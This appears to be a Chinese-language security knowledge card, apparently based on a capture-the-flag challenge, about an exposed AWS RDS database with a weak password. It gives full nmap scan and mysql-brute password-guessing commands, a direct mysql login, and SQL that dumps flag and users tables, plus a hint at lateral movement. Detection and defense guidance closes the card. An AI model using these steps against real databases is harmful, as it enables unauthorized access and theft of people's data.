---
id: cloud-public-rds-open-weak-password-flag
title: 公网可访问 RDS + 弱口令：nmap mysql-brute 命中 dbuser:123 直连数据库拖库
type: scenario
domain: cloud
path: cloud
technique: public-rds-weak-password-direct-dump
aliases:
- 公网 RDS 弱口令
- PubliclyAccessible RDS
- mysql-brute RDS
- RDS 3306 暴露
- 云数据库拖库
tags:
- cloud
- aws
- rds
- mysql
- weak-password
- exposure
- database
- data-loot
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V660
  verified_at: '2026-11-13T06:49:02+08:00'
  notes: 已对照12456原文挑战4与全部图片核对：nmap 对 3306/5432/1433/1521 端口识别、mysql-brute dbuser:123 命中、mysql 直连 use user_info/select * from flag 与 users 表泄漏均一致；原文未标注组件版本，affected_versions 空缺正确；dedup 首位为自身，与其后 RDS 快照还原/MySQL 写马/ClickHouse 横向卡均非同链。PoC 未复跑。
---

## 一句话结论

RDS 实例被配置为 `PubliclyAccessible=true` 且安全组对公网开放时，攻击者可直接对 3306/1433/1521/5432 做服务识别与低速口令猜测；本文用 `nmap --script=mysql-brute` 命中 `dbuser:123`，用 mysql 客户端直连后读取 `user_info.flag` 与整张 users 表，完成云数据库拖库。

## 原理

- RDS 的 `PubliclyAccessible` 决定实例是否分配公网地址并允许从互联网访问；它与安全组是两道独立开关，任一配置不当都可能把数据库暴露到公网。
- 数据库引擎（MySQL/Oracle/MSSQL/PostgreSQL）默认端口固定、握手特征明显，`nmap -sV` 可直接识别；弱口令（如 `dbuser:123`）可通过 `mysql-brute` 等脚本以极低速率命中。
- 一旦拿到可登录的数据库账户，攻击者就等同于绕过应用层直接访问数据：`show databases`、`select * from flag`、导出 users 表都在 SQL 权限内完成，不依赖任何 Web 漏洞。
- 云上此类暴露常见于“临时排查”“迁移测试”后忘记关闭公网访问，或为方便把安全组设为 0.0.0.0/0；由于数据库端口不经过应用 WAF，风险高于普通 Web 暴露面。
- 防御侧可用 `aws rds describe-db-instances` 的 `PubliclyAccessible` 字段批量发现，再在控制台把实例改为“不可公开访问”。

## 触发条件

- RDS 实例 `PubliclyAccessible=true`，且安全组/网络 ACL 允许攻击者来源访问数据库端口。
- 数据库存在可登录的弱口令账户（或口令可猜测），且未限制来源 IP。
- 攻击者能访问对应端口（公网直连或经跳板/代理）。

## 利用步骤

1. 识别暴露面：`nmap -Pn -p3306,5432,1433,1521 <rds-endpoint>`，确认引擎与端口。
2. 低速口令猜测：`nmap -Pn -p3306 --script=mysql-brute --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt <endpoint>`。
3. 客户端连接：`mysql -udbuser -p123 -h <endpoint>`。
4. 枚举与拖库：`show databases; use user_info; show tables; select * from flag; select * from users;`。
5. 评估数据价值并继续横向（同口令复用、内网主机名/账号信息）。

## PoC

```bash
nmap -Pn -p3306,5432,1433,1521 <rds-endpoint>
nmap -Pn -p3306 --script=mysql-brute \
  --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt <rds-endpoint>
# | mysql-brute: dbuser:123 - Valid credentials

mysql -udbuser -p123 -h <rds-endpoint>
```

```sql
show databases;
use user_info;
select * from flag;
```

## 变体与关联

- 变体：Oracle 1521、MSSQL 1433、PostgreSQL 5432 同样可被暴露与弱口令命中；不同引擎换用对应客户端与字典。
- 变体：公网暴露的 RDS 快照可被恢复出主密码（见关联卡）；快照共享与实例公开是两条独立的数据泄露路径。
- 关联：[[cloud-public-rds-snapshot-restore-master-password-data-loot]]（RDS 快照恢复取主密码）、[[pentest-initial-access-mysql-weak-password-outfile-webshell]]（MySQL 弱口令的写马延伸）、[[cloud-public-ebs-snapshot-volume-mount-credential-loot]]（公开快照挂载取凭据）。
- 边界：实例为私有子网、安全组仅放行应用安全组、强口令且启用 IAM 数据库认证/失败锁定时失效。

## 检测与防御

- 检测：CloudTrail/RDS 日志中的异常来源连接与失败登录；数据库审计中的全表查询与批量导出；公网扫描器对 3306 的探测流量。
- 防御：生产 RDS 一律 `PubliclyAccessible=false` 并置于私有子网；安全组只放行应用层安全组；强口令/Secrets Manager 托管并定期轮换；启用失败锁定与连接审计；定期用 `describe-db-instances` 巡检公开实例。
